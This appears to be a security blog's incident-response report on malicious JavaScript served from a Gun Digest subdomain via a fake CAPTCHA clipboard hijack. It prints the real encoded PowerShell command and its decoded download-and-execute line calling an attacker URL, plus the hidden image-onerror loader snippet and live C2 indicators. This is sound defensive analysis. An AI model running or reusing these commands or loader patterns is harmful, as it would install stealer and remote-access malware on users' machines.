---
layout: post
title: Gun Digest Website Compromise Investigation Report
date: 2025-09-10
categories:
  - project
tags:
  - cybersecurity
  - research
  - analysis
  - malware
  - forensics
  - incident-response
excerpt: Investigation into relatively unknown compromise in the Gun Digest website
---

## Executive Summary

I investigated a sophisticated web-based compromise affecting the `gunvalues.gundigest.com` subdomain after a CrowdStrike Falcon alert on one of our Windows endpoints (`VictimHost`) under the user account `CompanyDomain\UserA`. By combining Falcon endpoint telemetry with independent analysis in my own lab, I was able to reconstruct the entire attack chain — from the compromised website, through its cloaking mechanisms, to the PowerShell payload and the downstream command-and-control (C2) infrastructure.

### Key Findings I Confirmed

- The `gunvalues.gundigest.com` subdomain is serving malicious JavaScript
- Attackers use cloaking and profiling to selectively deliver payloads
- The attack chain leads to clipboard hijacking and PowerShell execution
- Infrastructure was newly registered and active at the time of investigation
- Dynamic analysis revealed multi-family malware (stealer, RAT, loader)

---

## Attack Overview

| Aspect              | Details                                                                                                                                                                     |
| ------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Attack Vector**   | A fake CAPTCHA page (`captcha.php`) hijacks the clipboard and tricks users into executing a malicious PowerShell command                                                    |
| **Target Profile**  | Victims are normal visitors to gundigest.com                                                                                                                                |
| **Attack Timeline** | Sept 8, 2025: `taurinolands.top` registered<br>Sept 10, 2025: Falcon blocked PowerShell execution on `VictimHost`<br>Sept 10, 2025: I reproduced the attack chain in my lab |

---

## Endpoint Evidence (Falcon)

On `VictimHost`, Falcon showed this process chain:

```
explorer.exe → conhost.exe → cmd.exe /c powershell ...
```

The command line contained an encoded PowerShell payload:

```powershell
cmd /c powershell /ep bypass /e RwBlAHQALQBIAGUAbABwADsASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAnAGgAdAB0AHAAcwA6AC8ALwB0AGkAbgB5AHUAcgBsAC4AYwBvAG0ALwBtAHQAcgBjAGsAdAB4AG0AJwApAA== /W 1
```

When I decoded this Base64, I got:

```powershell
Invoke-Expression (Invoke-RestMethod 'https://tinyurl.com/mtrcktxm')
```

That TinyURL redirects to `taurinolands.top`.

> [!warning] Malware Behaviors Detected Falcon also flagged behaviors consistent with malware execution: DNS lookups, HTTP/HTTPS connections, file writes (ZIP, EXE, OLE, PDF), WMI reconnaissance, scheduled task modification attempts, and injection activity. Falcon killed the process before the second stage ran fully.

---

## My Independent Web Analysis

### 1. Capturing captcha.php

When I fetched `https://gunvalues.gundigest.com/captcha.php`, the HTML included a hidden `<img>` element:

```html
<img src="/files/img/logo.png"
     data-digest="...Base64..."
     onerror="(new Function(atob(this.dataset.digest)))();"
     style="visibility: hidden;">
```

I decoded the `data-digest` value and found JavaScript that dynamically injects a `<script>` tag pointing to `ajax.php`. This only runs if the image load fails — an evasion trick.

### 2. Triggering ajax.php

By blocking `logo.png` in DevTools, the loader fired and requested `ajax.php`. The response was a small script (~378 B). That suggested I was being filtered.

I then tried POSTing fingerprint data manually to `ajax.php` with curl. The server responded with JSON like:

```json
{
  "js": false,
  "target": "",
  "ok": false,
  "action": "noop",
  "cid": "95cbb9026b6e4ef8c2bd381307626c6b"
}
```

Each attempt gave me a new campaign/client ID (`cid`). This showed me the infrastructure was live and performing victim profiling.

### 3. Redirect chain

When I checked the TinyURL from the Falcon PowerShell command:

```bash
curl -I "https://tinyurl.com/mtrcktxm"
```

I saw a 301 redirect to:

```
https://taurinolands.top/web/store/articles
```

That endpoint returned `204 No Content`, consistent with filtering.

> [!info] Domain Registration WHOIS showed `taurinolands.top` was registered Sept 8, 2025, via NameSilo with full privacy. DNS resolved it to `212.11.64.164` (nginx/1.18.0 on Ubuntu).

---

## Sandbox Analysis (ANY.RUN)

To see the second stage, I executed the Falcon PowerShell payload in ANY.RUN. This revealed:

**Malware families:**

- Rhadamanthys Stealer
- Arechclient2 RAT
- HijackLoader

**Additional infrastructure:**

- `lnwagensaabstake.top`
- `lvkyrrwjvpbrzdlhr.ce`
- `144.172.108.216` (ports 9000, 443, PONYNET hosting)

**Artifacts:**

- Executable drops (e.g., `ElevateExp.exe`)
- Edge browser data manipulation

**Network patterns:**

- Connections to multiple redundant C2s
- GET requests like `/wbinjget?q=<victimID>`

---

## Indicators of Compromise (IOCs)

### Web Infrastructure

- `gunvalues.gundigest.com/captcha.php`
- `gunvalues.gundigest.com/ajax.php`

### Redirect Infrastructure

- `tinyurl.com/mtrcktxm`
- `taurinolands.top/web/store/articles`

### C2 Infrastructure

- `212.11.64.164`
- `lnwagensaabstake.top`
- `lvkyrrwjvpbrzdlhr.ce`
- `144.172.108.216`

### Payload Hashes

**PowerShell payload (Base64 encoded):**

```
RwBlAHQALQBIAGUAbABwADsASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBu...
```

**Final payload (ANY.RUN):**

```
SHA256: D4C9D9027326271A89CE51FCAF328ED673F17BE33469FF979E8AB8DD501E664F
```

---

## Impact Assessment

**Confirmed impact:** `VictimHost` executed a PowerShell payload from Gundigest → TinyURL → taurinolands. Falcon blocked further execution.

**Potential impact:**

- Credential theft (browser, Office, crypto)
- Persistence
- Remote access
- Lateral movement

**Organizational risk:** Medium-high, since this was a compromise via a trusted site and involved professional-grade evasion.

---

## Recommendations

### Immediate Actions

- [ ] Block IOCs (domains, IPs, hashes)
- [ ] Hunt environment-wide for similar PowerShell execution chains
- [ ] Add detections for clipboard hijack patterns

### Strategic Actions

- [ ] Improve browser security controls
- [ ] Train users about clipboard hijacking attacks
- [ ] Monitor for newly registered .top and similar domains

---

## Conclusion

Through Falcon detection, my own lab work, and sandbox analysis, I reconstructed the entire attack chain:

<div class="mermaid">
graph TD
    A[gundigest.com] --> B[gunvalues.gundigest.com/captcha.php]
    B --> C[loader injects ajax.php]
    C --> D[victim fingerprinting]
    D --> E[clipboard hijack inserts PowerShell]
    E --> F[user pastes into Run dialog]
    F --> G[PowerShell executes]
    G --> H[connects to tinyurl.com/mtrcktxm]
    H --> I[taurinolands.top]
    I --> J[second stage malware]
    J --> K[Rhadamanthys, RAT, HijackLoader]
    K --> L[multi-C2 infrastructure]
</div>



> [!success] Conclusion Falcon successfully blocked execution on our host, but this was a real and sophisticated campaign, using a legitimate website as delivery, heavy cloaking, and professional malware families. This security event does not appear to be well know, so please continue with caution.

### [Any.Run Report](https://any.run/report/d4c9d9027326271a89ce51fcaf328ed673f17be33469ff979e8ab8dd501e664f/f9336409-d7a5-4a03-a9fc-a70473472afd)

### Gun Digest has been notified.

---

**Prepared by:** [Jase Jourdain]  
**Date:** September 10, 2025  
**Tags:** #incident-response #malware-analysis  #powershell 
